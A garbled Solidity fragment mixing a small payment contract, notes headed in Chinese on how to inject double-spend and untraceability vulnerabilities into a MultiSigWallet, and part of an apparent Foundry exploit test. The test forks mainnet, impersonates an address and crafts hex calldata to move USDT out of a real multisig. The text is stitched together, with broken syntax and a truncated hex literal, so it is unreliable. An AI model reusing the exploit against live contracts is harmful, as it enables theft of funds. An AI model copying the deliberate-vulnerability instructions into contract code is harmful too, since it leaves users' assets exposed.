
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity 0.8.10;

### 数据双花;
The vulnerability of data double flow can be injected at line 46, just after the call of `MultiSigWallet.submitTransaction`, by adding a parameter `receiptId` at the end of the `_message` variable. The `receiptId` is a unique identifier in the transaction, which is generated by the hash function of the `recipient` address and the `receiptId` itself.;
;
### 交易不可追溯性;
The vulnerability of transaction non-traceability can be injected at line 39, just after the call of `MultiSigWallet.getConfirmations`, by adding a parameter `txHash` at the end of the `MultiSigWallet.confirmTransaction` function. The `txHash` is the hash value of the transaction.;
;
### 完整修改后的合约代码;
```Solidity;

;
;
contract ContractTest is DSTest {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    MultiSig MultiSigWallet =;
    MultiSig(payable(0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6));
    address[] public owner;
    function setUp() public {
        cheat.createSelectFork("mainnet", 15012645)};
    function testExploit() public {
        emit log_named_uint("USDT balance of attacker before Exploit",
        usdt.balanceOf(address(this)));
        emit log_named_uint("How many approval required:",
        MultiSigWallet.required());
        cheat.prank(0xf845A7ee8477AD1FB4446651E548901a2635A915);
        bytes memory msgP1 = hex"fe7f61ea000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000913e1f5a20000000000000000000000000";
        bytes memory recipient = abi.encodePacked(address(this));
        bytes memory receiptId = hex"d48d952695ede26c0ac11a6028ab1be6059e9d104b5520
function commitData(bytes32 dataHash) public {
    require(dataRecord[dataHash] == 0);
    dataRecord[dataHash] = block.timestamp}
function deposit() public payable {
}